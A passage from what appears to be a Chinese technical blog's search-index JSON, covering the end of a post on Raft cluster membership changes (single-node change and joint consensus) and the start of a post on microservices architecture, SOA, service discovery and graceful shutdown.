如果新的snapshot的index大于最新apply的log的index</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> self.lastSnapshotIndex &gt; self.lastApplied &#123;</span><br><span class=\"line\">\t\t\tself.statemachine.NotifySnapshot(args)</span><br><span class=\"line\">\t\t\tself.commitIndex = Max(self.commitIndex, self.lastSnapshotIndex)</span><br><span class=\"line\">\t\t\tself.lastApplied = self.lastSnapshotIndex</span><br><span class=\"line\">\t\t&#125; </span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treply.Term = rf.currentTerm</span><br><span class=\"line\">\treply.Success = <span class=\"literal\">true</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"成员变更\"><a href=\"#成员变更\" class=\"headerlink\" title=\"成员变更\"></a>成员变更</h3><p>集群成员的变更不是一个很有意思的话题，不太会让人感兴趣。只不过这个过程在里面是非常有技术性的一个事情，所以值得提出来讲一讲。</p>\n<p>成员变更发生在机器故障需要替换，或者成员副本需要增加和减少的时候。</p>\n<h4 id=\"存在的问题\"><a href=\"#存在的问题\" class=\"headerlink\" title=\"存在的问题\"></a>存在的问题</h4><p>成员变更过程有一个很严重的技术问题需要解决，在变更过程中可能会存在两个leader。</p>\n<p>比如我们现在有1，2，3三台server，准备往里面添加4，5两个节点来扩充，我们给1，2，3中的leader发送一个添加节点D，E的请求，leader把请求通过日志分发给另外两个，当日志被commit之后，1，2，3就开始apply这条日志，apply的结果就是把自己的group成员变成1，2，3，4，5这5个。但是apply的过程并不是同时发生的，不同节点apply的时间点是有先后的。</p>\n<p>比如下图中，3先apply了（这时候会发生4和5开始追赶leader日志的过程，但是这个过程这里不重要），3，4，5认为集群有5个节点，然后他们可以因为网络抖动或者网络隔离触发leader选举，他们三个达到了大部分，就会选出一个leader；1和2还没有apply，他们也会因为网络抖动触发选举，他们认为集群有3个节点，然后他们两个达到了大部分，就会选出一个leader，集群就分成了两个，有两个leader了,两个leader还是同一个term的，这是不允许的。</p>\n<p><img src=\"/linkimage/raft/member_add.png\" alt=\"member_add\"></p>\n<p>那解决这个问题的方案有两个。</p>\n<h4 id=\"方案一单节点变更\"><a href=\"#方案一单节点变更\" class=\"headerlink\" title=\"方案一单节点变更\"></a>方案一单节点变更</h4><p>我们看到上面有问题的例子中，是两个节点一起添加，如果一次只添加一个节点就不会有这个问题。我们先一步把4添加进去，再一步把5添加进去。</p>\n<p>先向3个中添加4：</p>\n<p><img src=\"/linkimage/raft/member3_add_1.png\" alt=\"member3_add_1\"></p>\n<p>图片来自 <a href=\"https://honorjoey.top/2020/07/04/%E5%88%86%E5%B8%83%E5%BC%8F-Raft%E7%AE%97%E6%B3%95%28%E4%B8%89%29-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E6%88%90%E5%91%98%E5%8F%98%E6%9B%B4%E9%97%AE%E9%A2%98/\">分布式-Raft算法(三)如何解决成员变更问题</a></p>\n<p>可以看到新旧配置要想分别组成两个group，旧配置需要两个节点，新配置需要3个节点，但是总的只有4个节点，所以一定有一个交叉的节点是两边都属于的。那么这个交叉的节点一旦投给了一个新（或旧）就不可能再同一个term的投票中在投给旧（或新）。也就不会出现同一个term存在两个leader的情况了。</p>\n<p>接着向4个中添加5：</p>\n<p><img src=\"/linkimage/raft/member4_add_1.png\" alt=\"member4_add_1\"></p>\n<p>图片来自 <a href=\"https://honorjoey.top/2020/07/04/%E5%88%86%E5%B8%83%E5%BC%8F-Raft%E7%AE%97%E6%B3%95%28%E4%B8%89%29-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E6%88%90%E5%91%98%E5%8F%98%E6%9B%B4%E9%97%AE%E9%A2%98/\">分布式-Raft算法(三)如何解决成员变更问题</a></p>\n<p>同样，往4个节点中添加1个，一样会存在一个交叉的节点，这个交叉的节点可以防止集群出现两个相同term的leader。</p>\n<p>移除节点的过程可以通过画类似的图来分析，这个单节点变更的过程已经被证明是可以安全的变更集群成员的。这也是工程实践中用的最多的实现，因为他容易理解也容易实现。</p>\n<h4 id=\"方案二：联合共识（joint-consensus）\"><a href=\"#方案二：联合共识（joint-consensus）\" class=\"headerlink\" title=\"方案二：联合共识（joint consensus）\"></a>方案二：联合共识（joint consensus）</h4><p>回想上面添加多个节点时出问题的场景，1，2组成了老集群，3，4，5组成了新集群，出现这个问题的本质原因是把这个分布式场景下的配置变更想象成了一个单步完成的过程，事实上，无论你如何安排这个流程，只要是某个节点单步的从旧配置切换到新配置，就一定会出现某个节点先跟新节点组成新集群，而后变更的节点组成旧集群。</p>\n<p>我们必须引入一种中间态，这种中间态是新旧集群共同治理的状态。如果把旧集群配置叫做C_old，新配置叫做C_new,那么共同治理的中间态就可以叫做C_old_new.</p>\n<p>这个中间态中，集群要想达成一致意见—包括选leader–包括commit日志，都得同时满足新集群和旧集群的commit条件才行。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C_old       C_new         Result            C_old_new Pass?</span><br><span class=\"line\">1 2 3       1 2 3 4 5     1+ 2+ 3- 4- 5-    C_old+ C_new- =&gt; FAIL</span><br><span class=\"line\">1 2 3       1 2 3 4 5     1- 2+ 3- 4+ 5+    C_old- C_new+ =&gt; FAIL</span><br><span class=\"line\">1 2 3       1 2 3 4 5     1+ 2+ 3+ 4- 5-    C_old+ C_new+ =&gt; pass</span><br><span class=\"line\">1 2 3       1 2 3 4 5     1+ 2+ 3- 4+ 5-    C_old+ C_new+ =&gt; pass</span><br></pre></td></tr></table></figure>\n\n<p>我们可以想象到这个状态是一个很安全的状态，他顶多是让提交一项日志变得困难了，但不会错误的提交一项日志。</p>\n<p>所以整个过程如下：</p>\n<p><img src=\"/linkimage/raft/joint_consensus_steps.png\" alt=\"joint_consensus_steps\"></p>\n<ol>\n<li><p>leader接收到配置变更的请求，leader把新老配置打包成C_old_new，（这里同样会先有个新节点日志追赶的过程）并分发给所有的节点，包括新老集群的节点，因为共同治理阶段是新老节点都要一起参与的，所以新老节点都要接收这个日志。</p>\n</li>\n<li><p>随后C_old_new被commit，整个集群就正式进入共同治理的阶段；C_old_new提交后，意味着整个集群再也不可能回到old的状态了。</p>\n</li>\n<li><p>处于共同治理的集群可以持续任意时间，leader如果因为某些原因在该状态持续时间较长也没什么问题。这期间的leader只会有一个，即便重新选leader也是选出同时被新老集群接受认可的一个leader，这期间的所有日志都是满足新老集群共同的提交条件的。</p>\n</li>\n<li><p>leader把C_new打包成日志存入本地，并广播给新老集群。</p>\n</li>\n<li><p>C_new被commit，整个配置变更过程结束。</p>\n</li>\n</ol>\n<p>下面针对这个过程中的几个细节展开一下：</p>\n<ol>\n<li>步骤1和2中，有两个时间点，一个是leader写入本地C_old_new日志t1，一个是leader提交C_old_new日志t2。</li>\n</ol>\n<p>t1之前leader commit日志的条件是C_old,这很明显；在t2之后leader commit日志的条件是C_new，这我们也已经知道了。那t1-t2之间呢，t1-t2之间使用的规则也是C_old,因为这中间commit的日志肯定是C_old_new之前的，所以当然应该用C_old的条件；那t2时刻呢，也就是C_old_new本身的commit条件是什么呢？C_old_new被commit的条件就已经得是共同治理的条件了，要新老集群都满足commit条件。为什么呢？原因很简单，如果只满足old的条件，不满足new的条件，这意味着C_old_new在新集群中是不稳定的，是可能被覆盖掉的，如果这个C_old_new日志都还不稳定，那后面基于C_old_new做的决策也就是不可靠的，那我们也就不能确保这个集群进入了共同治理的状态了。</p>\n<p>总结就是:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">t &lt;  t2 =&gt; use C_old commit</span><br><span class=\"line\">t &gt;= t2 =&gt; use C_new commit</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><p>步骤2中，如果在C_old_new被commit之前leader挂掉了，那会发生什么呢？有两种情况：</p>\n<p>一种是集群发生选举，一个包含C_old_new的节点赢得了新老集群共同的认可，成为leader，于是整个配置变更过程继续，因为新leader知道现在处于配置变更过程中。C_old_new被commit的工作将由新的leader接手继续推进。</p>\n<p>另一种是不包含C_old_new的节点成为leader，这是怎么发生的呢，比如有1，2，3的旧集群，添加4，5，6，7四个节点，新集群就是1，2，3，4，5，6，7。然后leader是3，3下发C_old_new给4，5，6，7后挂掉，这时候leader选举情况如下：</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">          C_old | C_new         |Result               |  C_old ?  C_new Pass? C_old_new?</span><br><span class=\"line\">[old选举]  1 2 3 | 1 2 3 4 5 6 7 |1+ 2+ 3- 4- 5- 6- 7- |  Pass     ----        ----</span><br><span class=\"line\">[new选举]  1 2 3 | 1 2 3 4 5 6 7 |1- 2- 3- 4+ 5+ 6+ 7+ |  Fail     Pass        Fail</span><br><span class=\"line\">\t</span><br></pre></td></tr></table></figure>\n\n<p>​    这时候1和2还是C_old，那么1，2组成C_old的大多数，就可以在其中选出一个leader出来。4，5，6，7也尝试成为leader，并成为新集群的大多数。但是C_old_new以及其之后的条件必须是新老集群都满足commit（这是我们前面推导出来的安全commit的规则），所以即便新集群的配置下满足选出leader的条件，但是旧集群因为都不认识这些节点也就不会选他们为leader。所以选leader失败。这时候整个集群只有一个leader，leader使用老配置，配置变更失败。但是集群并没有处于混乱状态，没有错误发生。注：这种场景下，4，5，6，7会不停骚扰1，2要求选举，1，2会有一些保护措施来避免骚扰到，这里不展开。</p>\n<ol start=\"3\">\n<li><p>步骤4写入C_new,步骤5 Commit C_new，那么C_new的commit条件是什么呢，是C_old_new还是C_new呢？</p>\n<p>保守一点的话使用C_old_new即可，这是一种稳健的方式。不过也许可以激进一步，跟C_old_new那样，只要已接收C_old_new就使用C_old_new的规则。我们来比较一下。</p>\n</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>commit条件</th>\n<th>C_new日志commit成功</th>\n<th>leader挂掉_新leader含C_new</th>\n<th>leader挂掉_新leader不含C_new</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>使用C_old_new</td>\n<td>配置变更成功</td>\n<td>继续推进C_new的commit</td>\n<td>从C_old_new状态重新写入C_new</td>\n</tr>\n<tr>\n<td>使用C_new</td>\n<td>配置变更成功</td>\n<td>继续推进C_new的commit</td>\n<td>从C_old_new状态重新写入C_new</td>\n</tr>\n</tbody></table>\n<p>可以看到无论使用C_old_new还是C_new效果都是一样的，那么从效率和方案的前后一致性上面来讲，我们规定C_new一旦接收就按照C_new的条件来判定commit，这样似乎更优雅一些。</p>\n<p>回顾一下整个过程如下：</p>\n<p><img src=\"/linkimage/raft/joint_consensus_flow.png\" alt=\"joint_consensus_step\"></p>\n<p>图片来自 <a href=\"http://liuyangming.tech/05-2019/raft.html\">读Paper——Raft算法解读</a></p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p> <a href=\"https://www.haproxy.com/fr/blog/using-haproxy-with-the-proxy-protocol-to-better-secure-your-database/\">Using HAProxy with the Proxy Protocol to Better Secure Your Database</a></p>\n<p><a href=\"https://yizhi.ren/2019/06/25/microservice/\">微服务</a> </p>\n<p> <a href=\"https://www.jianshu.com/p/528ce5cd7e8f\">一致性Hash原理与实现</a></p>\n<p> <a href=\"https://zhuanlan.zhihu.com/p/41228196\">P2P 网络核心技术：Gossip 协议</a></p>\n<p><a href=\"https://www.cnblogs.com/Chary/p/13950387.html\">一致性算法 Paxos</a></p>\n<p> <a href=\"https://www.jianshu.com/p/0ba4d0e03a71\">Paxos协议初探</a></p>\n<p><a href=\"https://yfscfs.gitee.io/post/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E5%8D%8F%E8%AE%AE%E4%B8%8E%E7%AE%97%E6%B3%95%E5%AE%9E%E6%88%98-08-raft%E7%AE%97%E6%B3%95-%E4%BA%8C-%E5%A6%82%E4%BD%95%E5%A4%8D%E5%88%B6%E6%97%A5%E5%BF%97/\">Raft算法 二 如何复制日志</a></p>\n<p><a href=\"https://www.sohu.com/a/214834823_411876\">实例详解ZooKeeper ZAB协议、分布式锁与领导选举 </a></p>\n<p> <a href=\"https://raft.github.io/raft.pdf\">In Search of an Understandable Consensus Algorithm</a></p>\n<p><a href=\"https://honorjoey.top/2020/07/04/%E5%88%86%E5%B8%83%E5%BC%8F-Raft%E7%AE%97%E6%B3%95%28%E4%B8%89%29-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E6%88%90%E5%91%98%E5%8F%98%E6%9B%B4%E9%97%AE%E9%A2%98/\">分布式-Raft算法(三)如何解决成员变更问题</a></p>\n<p><a href=\"http://liuyangming.tech/05-2019/raft.html\">读Paper——Raft算法解读</a></p>\n","categories":["架构"],"tags":["分布式"]},{"title":"微服务架构","url":"/2019/06/25/microservice/","content":"<h1 id=\"微服务架构\"><a href=\"#微服务架构\" class=\"headerlink\" title=\"微服务架构\"></a>微服务架构</h1><p>注意：本文涉及面大而广，预计完整阅读时间在1个小时，可以挑章节选择性阅读。</p>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>什么是微服务，以下定义来自维基百科</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">微服务 (Microservices) 是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块 (Small Building Blocks) 为基础，</span><br><span class=\"line\">利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关 (Language-Independent/Language agnostic) 的 API 集相互通信。</span><br></pre></td></tr></table></figure>\n\n<p>所以微服务是一种架构层面的概念，它是一种通过一套小型服务来开发单个应用的方法，每个服务运行在自己的进程中，并通过轻量级的机制进行通讯, 通常是通过HTTP。</p>\n<h2 id=\"微服务历史\"><a href=\"#微服务历史\" class=\"headerlink\" title=\"微服务历史\"></a>微服务历史</h2><p>微服务这个概念在2012年开始出现，作为加快应用程序开发进程的一种方法。</p>\n<p>随后微服务架构实践开始在各大软件大会上被分享。2014年Martin Fowler发表文章《Microservices》,这是第一篇详细介绍微服务的文章。对微服务进行了定义，并与传统架构进行了对比，阐述了微服务的优势。</p>\n<p>到了2015年，微服务已经很流行，凡是新建的项目，不论是初创公司还是老牌大厂，微服务都会是首选的架构。互联网企业是这样，就算是嵌入式环境下，微服务也被引入并且推广。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"微服务与SOA\"><a href=\"#微服务与SOA\" class=\"headerlink\" title=\"微服务与SOA\"></a>微服务与SOA</h2><p>说到微服务，就不得不说SOA(Service-oriented architecture)架构。我们难免会有个疑问，微服务与SOA是什么关系，有的人说他们两个完全不同，有自己独特的应用范畴，有人认为他们两个类似，具有相同的工作原理，还有人说微服务是一种细粒度的SOA，或者微服务是SOA的一种应用。我们现在来找一下他们之间的关系。</p>\n<h3 id=\"应用范围\"><a href=\"#应用范围\" class=\"headerlink\" title=\"应用范围\"></a>应用范围</h3><p>通常我们提到SOA的时候，似乎总是接受了SOA是拥有企业范围的，应用程序以服务的形式在该范围内彼此通信。SOA要求应用程序通过标准化接口来提供服务。而微服务架构似乎是拥有应用程序范围，仅关注一个应用改程序内部的结构和组件。下图展示了这个差别。</p>\n<p><img src=\"/linkimage/microservices/fanwei.jpg\" alt=\"fanwei\"></p>\n<p>图片来自 <a href=\"https://www.ibm.com/developerworks/cn/websphere/library/techarticles/1601_clark-trs/1601_clark.html\">IBM Developer</a></p>\n<h3 id=\"SOA架构侧重\"><a href=\"#SOA架构侧重\" class=\"headerlink\" title=\"SOA架构侧重\"></a>SOA架构侧重</h3><p>当你分析SOA时，你会发现SOA包含两个侧重面。</p>\n<p>一个是侧重集成。这个方面是指，SOA的目的之一就是适配现有系统中的的专用数据格式、协议、传输机制，并使用标准化的机制将这些适配公开为服务。这部分描述大概等于我们通常说的ESB(企业服务总线)。</p>\n<p>适配和以标准化方式公开服务是SOA必不可少的，他侧重于系统集成和程序设计。见下图左。</p>\n<p>另一个侧重面是功能重构，这个方面是指，如果当前系统提供了太细粒度的功能接口，导致公开了系统内部太多复杂的业务模型；或者所需的数据分散在多个数据系统；或者数据模型所使用的术语不同于业务部门，那么我们就需要创建新的程序，将多个现有的系统绑定在一起，这些程序在SOA的服务组件框架（Service Component Architecture，SCA）中被叫做服务组件，服务组件组成程序集，程序集构成应用（也叫业务组件）。</p>\n<p>见下图右。</p>\n<p><img src=\"/linkimage/microservices/jicheng.jpg\"></p>\n<p>图片来自 <a href=\"https://www.ibm.com/developerworks/cn/websphere/library/techarticles/1601_clark-trs/1601_clark.html\">IBM Developer</a></p>\n<h3 id=\"微服务架构侧重\"><a href=\"#微服务架构侧重\" class=\"headerlink\" title=\"微服务架构侧重\"></a>微服务架构侧重</h3><p>从上面SOA的侧重中可以看到，从集成方面来讲，SOA跟微服务毫无关系，而从功能重构方面来讲，SOA和微服务是有类似的。</p>\n<p>微服务主要强调在应用程序内部分解成服务组件，这点跟SOA的功能重构是相似的。实行微服务架构的应用，从外部来看，应用仍是相同的，是否使用微服务架构将不影响API的数量和API的粒度。微服务的微反映在内部组件的粒度。如下图，微服务应用程序在应用程序边界上公开与单体应用程序相同的接口。</p>\n<p><img src=\"/linkimage/microservices/sameapi.jpg\" alt=\"sameapi\"></p>\n<p>图片来自 <a href=\"https://www.ibm.com/developerworks/cn/websphere/library/techarticles/1601_clark-trs/1601_clark.html\">IBM Developer</a></p>\n<p>那么SOA和微服务在组件分离上有没有什么差别呢，其实一直以来，在应用内进行组件分离不是什么新鲜事，有很多实践被用来在应用内干净地分离逻辑。而微服务的特点是将分离更加彻底，把组件进行了绝对隔离，他们变成了网络上单独运行的进程。如下图，展示了从单个庞大的应用程序到微服务的变化过程。</p>\n<p><img src=\"/linkimage/microservices/compose.jpg\" alt=\"compose\"></p>\n<p>图片来自 <a href=\"https://www.ibm.com/developerworks/cn/websphere/library/techarticles/1601_clark-trs/1601_clark.html\">IBM Developer</a></p>\n<h3 id=\"归纳差异\"><a href=\"#归纳差异\" class=\"headerlink\" title=\"归纳差异\"></a>归纳差异</h3><p>差异可以归纳为：</p>\n<p>SOA面向企业范围，微服务面向应用范围。</p>\n<p>SOA带有异构集成的语义，微服务没有这个语义。</p>\n<p>SOA服务内部支持组件分离的架构，微服务则是更彻底的组件分离架构-组件在网络上隔离。</p>\n<h2 id=\"微服务的特征\"><a href=\"#微服务的特征\" class=\"headerlink\" title=\"微服务的特征\"></a>微服务的特征</h2><p>下面的特征都是<a href=\"https://martinfowler.com/articles/microservices.html\">Microservices</a>文章中提到的，虽然非常全面和系统，但是原文比较难懂，我只简单总结他。</p>\n<h3 id=\"服务组件化\"><a href=\"#服务组件化\" class=\"headerlink\" title=\"服务组件化\"></a>服务组件化</h3><p>在构建软件的时候，我们非常希望可以像现实世界拼装物件一样，通过拼接组件来创建一个应用。我们对组件的定义是：组件是一个可独立替换和独立升级的软件单元。</p>\n<p>在过去，我们为大部分语言平台创建了大量的通用库。库作为组件的形式出现，库被连接到一个而程序中，并通过函数调用的方式被使用。</p>\n<p>微服务架构也会使用库，但是他们主要的组件化方式是把软件拆分成多个服务，这些服务运行在不同的进程中，通过web请求或者rpc进行交互。</p>\n<p>微服务做这种拆分的好处是这些服务可以被独立的部署。如果你使用库来构建你的应用，当你修改其中一个库的时候，你就必须重新部署整个应用。但是如果应用被拆分成多个服务，你只需要部署你修改的那个服务就可以了。当然这并不是绝对的，如果你修改了接口，可能导致相关的服务得跟着一起重新部署。一个好的微服务架构需要最小化这种关联，通过内聚服务的边界，以及通过服务合约来进行服务的进化，减少这类改动。</p>\n<p>服务组件相比库有个缺点，通过网络进行远程调用的成本更大，因此为了减少交互，服务接口通常是粗粒度的，这相对来说接口更复杂更难用。另外当你想要更改组件之间的职能分配时，跨进程会带来更大困难，因为不同服务持有的资源，数据是不同的，不一定能很轻松的实现其他服务能实现的功能。</p>\n<p>另外，一个服务通常是只需要一个进程，但是也不一定，比如一个服务可能需要一个业务进程加上一个数据库进程。</p>\n<p>组件化的服务在扩展时跟单体应用有很大的差别，主要表现在服务的按需扩展这一点，如下图：</p>\n<p><img src=\"/linkimage/microservices/servicescale.png\" alt=\"servicescale\"></p>\n<p>图片来自 <a href=\"http://blog.cuicc.com/blog/2015/07/22/microservices/\">微服务</a></p>\n<p>单体应用不得不整体一起扩展，而组件化的服务则只在需要时才扩展。</p>\n<h3 id=\"业务全栈化\"><a href=\"#业务全栈化\" class=\"headerlink\" title=\"业务全栈化\"></a>业务全栈化</h3><p>当我们想要拆分大型的应用时，通常的做法是按照职能分，比如UI，业务，DB，如下图左。这样的拆分有一个问题，就是当一个新功能被引入时，修改可能会涉及到UI+业务+DB，这样就会很容易带来跨部门的协作, 跨部门的协作往往是低效和高成本的。于是慢慢的，UI团队为了避免跨部门协作，把部分业务写进了UI层， 业务层为了跨部门协作，把DB和UI的业务写入了业务层。这将导致业务逻辑到处都是。</p>\n<p>而微服务的拆分方式是不一样的，他会按照业务来拆分，这个服务将会包含广泛的技术栈，包括UI，包括DB，包括业务逻辑，最终这样一个微服务团队是包含全栈技术，甚至包括PM的， 如下图右。</p>\n<p>这样看起来微服务架构中，一个微服务就得好多人。事实上不一定，有的团队中，一个服务一个人，有的团队里一个服务10个人，所以一个服务几个人还是不一定的。</p>\n<p><img src=\"/linkimage/microservices/seperate.png\" alt=\"seperatebybiz\"></p>\n<p>图片来自<a href=\"https://martinfowler.com/articles/microservices.html\">microservices</a></p>\n<h3 id=\"项目产品化\"><a href=\"#项目产品化\" class=\"headerlink\" title=\"项目产品化\"></a>项目产品化</h3><p>有时候我们开发一个项目的时候，一旦项目交付，这个项目就不归这个开发团队负责了，而是交给专门的维护团队。微服务的实践者往往不是这样，开发团队会负责整个产品的生命周期，开发者会因此经常的接触他们的服务，因为他们必须为这个产品负一定的支持责任。</p>\n<p>产品化的思维对单体应用也是用，但是微服务这样粒度的软件，更容易让开发者与这个服务以及服务的用户建立联系，因为微服务的功能都非常明确，不容易发生责任的交叉。</p>\n<h3 id=\"通信简单化\"><a href=\"#通信简单化\" class=\"headerlink\" title=\"通信简单化\"></a>通信简单化</h3><p>在不同进程之间通信时，通常会去加强通信机制本身，比如ESB就包含复杂的机制在消息编排，消息路由，消息转换上。</p>\n<p>微服务却偏爱更轻量的方式，最常被使用的两种协议，一个是基于HTTP请求的API，一个是基于轻量消息传递通道。轻量消息传递，意味着消息总线只负责消息传递，不做别的额外的工作。</p>\n<p>相对于基于内存的函数调用，进程间的调用有所不同，如果还是像函数调用那样，会导致跨进程调用过多，性能受到影响，所以服务间的调用尽量是粗粒度的，而不像函数调用那样细粒度。</p>\n<h3 id=\"管理去中心化\"><a href=\"#管理去中心化\" class=\"headerlink\" title=\"管理去中心化\"></a>管理去中心化</h3><p>集中式的管理的结果是在单一平台上实行标准化，但是这种方式的好处是有限的，因为这种解决方式并不是万能的，我们更加倾向于采用适当的工具解决适当的问题，整体式的应用在一定程度上比多语言环境更有优势，但通常不是的。</p>\n<p>把应用拆分后，你可以在开发上有更有选择，可以用Node.js来开发页面，用C++来开发高效的组件，用NoSql替换Mysql来提高读写性能，这都可以。分成不同服务后意味着你有了更多的选择。</p>\n<p>应用分拆后，你还可以分别去管理这些服务，服务团队将为他们开发的服务负责，包含7*24小时的运行。每天凌晨3点被报警吵醒会让你更加关注代码的质量。</p>\n<p>应用分拆后，数据也被分拆，这对数据更新带来挑战。单体应用是使用事务来保证一致性，而分布式事务是出了名的难以实现，所以微服务架构强调服务之间的无事务协调，并且明确认识到一致性可能只是最终一致性，而问题也将通过补偿操作来处理。处理一致性问题是一个新的挑战，但是通常业务上允许存在一定程度的不一致来快速响应需求，同时使用某种恢复过程来处理错误。只要处理错误的代价低于强一致性带来的业务损失（主要是性能）那么这就值得。</p>\n<h3 id=\"交付自动化\"><a href=\"#交付自动化\" class=\"headerlink\" title=\"交付自动化\"></a>交付自动化</h3><p>基础设施自动化技术在过去几年中得到了长足的发展：云计算，特别是AWS的发展，减少了构建、发布、运维微服务的复杂性。许多使用微服务架构的产品或者系统，它们的团队拥有丰富的持续部署和持续集成的经验。团队使用这种方式构建软件将更广泛的依赖基础设施自动化技术。这是这种自动化技术的流程：</p>\n<p><img src=\"/linkimage/microservices/pipiline.png\" alt=\"pipeline\"></p>\n<p>一个单体应用可以被构建被测试然后被推送到线上环境中，而一旦你投资了一整个推送到线上环境的自动化路线，那么你会发现部署更多的应用并没那么可怕。毕竟部署一个应用的过程是枯燥的，而部署三个应用的过程还是枯燥的，没有差别。</p>\n<p>我们看到团队使用广泛的基础设施自动化的另一个领域是管理生产环境中的微服务。但是与我们上面的断言”只要部署很无聊，单块和微服务之间没有太大的区别“相反，每个部署的运维环境可能会截然不同。</p>\n<h3 id=\"失效常态化\"><a href=\"#失效常态化\" class=\"headerlink\" title=\"失效常态化\"></a>失效常态化</h3><p>使用服务作为组件的一个结果在于应用需要有能容忍服务的故障的设计，任何服务调用都可能因为服务的不可用而失败，调用者就需要尽可能优雅的来处理这种结果。这对比单体应用是一个劣势，因为这引入了额外的复杂性。这也导致微服务团队时刻反思服务失败如何影响用户体验。</p>\n<p>因为服务随时可能失败，所以能够自动检测失败并且自动恢复服务就非常重要。微服务应用程序投入大量比重来进行应用程序的实时监测，比如检查架构方面的指标(每秒多少次数据请求)，比如检查业务相关指标(例如每分钟收到多少订单)。语义监测（定期运行一系列自动化测试用例，来测试线上环境是否有问题）可以提供一套早期预警系统，触发开发团队跟进和调查。</p>\n<h3 id=\"设计发展化\"><a href=\"#设计发展化\" class=\"headerlink\" title=\"设计发展化\"></a>设计发展化</h3><p>微服务从业者，通常有持续改进设计的背景，并且把服务组件化看做是一个更进一步的工具来控制应用的变化，同时不减缓应用的变化。控制变化不意味着减缓变化， 用正确的方法和工具，你可以频繁、快速且控制良好的更改你的应用。</p>\n<p>当你决定将应用拆分成微服务时，你将面临如何设计你的服务的问题，你拆分服务的原则是什么。回头看组件的定义是一个可独立替换和独立升级的软件单元，因此我们可以想象我们需要寻找的拆分点是当我们重写了这个组件后，不会影响这个组件的相关协作者。</p>\n<p>可替换性其实是一个更一般原则的特例，这个原则是通过变化来驱动模块化。你应该保持同一时间的变化只位于同一个模块中。很少变化的部分应该与大量变化的部分处于不同的模块中，而如果两个服务总是一起变化，那么这两个模块应该被合并。而可替换性其实就是一种可以独立变更的特性。</p>\n<p>应用拆分成微服务后，给我们提供了更细粒度发布应用的机会。单体应用的任何修改都需要发布整个应用，而微服务，你只需要重新部署修改的服务。这个过程可以简化和加速整个流程。但坏处是，你必须担心一个服务的变化会阻断其消费者。传统的集成方法试图使用版本管理解决兼容问题，但是微服务世界的偏好是只把版本管理作为最后的手段，多版本会带来复杂的测试和维护成本。我们可以避免大量的版本管理，通过把服务设计成对其他服务的变化尽可能的宽容。</p>\n<h2 id=\"微服务周边\"><a href=\"#微服务周边\" class=\"headerlink\" title=\"微服务周边\"></a>微服务周边</h2><p>前面对微服务的特性做了很多的总结，那假如我们要在实践中使用微服务架构，我们需要做哪些准备呢，或者说我必须具备了什么条件，我才能引入微服务架构？</p>\n<p>下图是与微服务相关的拓扑图，我们来详细展开讲解一下。</p>\n<p><img src=\"/linkimage/microservices/spiderdraw.png\" alt=\"spiderdraw\"></p>\n<p>图中包含3种颜色，绿色部分属于微服务运行时的4大基础设施，红色部分属于微服务架构的辅助支撑，蓝色部分属于微服务的优缺点。</p>\n<p>首先我们来看绿色的4个分支，分别是服务发现，服务配置，服务监控，请求追踪。</p>\n<h3 id=\"服务发现\"><a href=\"#服务发现\" class=\"headerlink\" title=\"服务发现\"></a>服务发现</h3><p>微服务架构中，再常见不过的莫过于扩容缩容了，那某个服务的上游如何应对下游的扩容缩容的。一种糟糕的方式是， 上游配置下游的ip列表，下游服务扩容缩容后通知所有的上游，让他们更新ip列表，这种方式有明显的缺陷，比如扩容还好一点只是上游不能很快发现新机器，缩容的话就麻烦了，上游会因为请求不到部分机器而报错；同时这种方式把服务严重耦合在一起，牵一发而动全身。</p>\n<p>所以我们常常使用服务发现的机制来应对服务的扩缩容，在服务启动成功后，把自己的服务地址（ip,端口等信息）注册到注册中心，上游服务则通过订阅或者轮询的方式从注册中心获取下游服务的地址，动态更新下游的ip列表。</p>\n<p><img src=\"/linkimage/microservices/register.jpg\"></p>\n<p>图片来自<a href=\"https://www.infoq.cn/article/YrmSMNOt49Qppi9e*uLX\">infoQ</a></p>\n<p>注册中心的原理当然非常简单，但是还是有一些注意点要提一下，</p>\n<h4 id=\"获取本地地址\"><a href=\"#获取本地地址\" class=\"headerlink\" title=\"获取本地地址\"></a>获取本地地址</h4><p>获取本机地址的方式通常有两种，一种是获取指定网卡的ip地址或者直接获取非回环地址的ip地址。</p>\n<p>一种是与注册中心建立socket连接，然后获取该socket的本地地址来作为注册的IP。</p>\n<h4 id=\"优雅下线\"><a href=\"#优雅下线\" class=\"headerlink\" title=\"优雅下线\"></a>优雅下线</h4><p>服务下线一般是在应用退出之前调用注册中心来下线服务，但是这里有两个隐患，一个是下线接口可能因为网络原因耗费很长的时间，导致服务长时间无法下线成功，上游服务还是会继续请求过来；一个是调用下线接口后，要记得做业务清理，也就是要等待当前正在处理的业务完成，否则可能出现数据丢失，文件损坏，响应丢失，交易中断等问题。</p>\n<p>通常的解决方案是，添加进程退出的钩子，下线服务时，脚本发送kill给进程，进程调用下线接口，同时给下线接口添加超时时间，比如30s，如果超时了这个请求还没有返回，就调用kill -9来杀死该进程。 而在下线服务时，进程可以异步去做业务清理。下线流程如下：</p>\n<p><img src=\"/linkimage/microservices/graceoffline.png\" alt=\"graceoffline\"></p>\n<p>图片来自 <a 